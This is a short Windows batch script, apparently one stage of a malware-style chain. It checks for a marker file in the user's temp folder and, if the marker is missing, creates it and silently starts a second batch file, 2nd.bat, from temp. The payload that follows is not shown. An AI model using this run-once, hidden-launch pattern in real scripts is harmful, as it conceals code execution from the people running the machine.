ECHO OFF
set trident="%UserproFile%\appdata\local\temp\BlocK.txt"
IF EXIST %trident% (exit) ELSE (copy NUL %trident% & start /b %UserProfile%\appdata\local\temp\2nd.bat)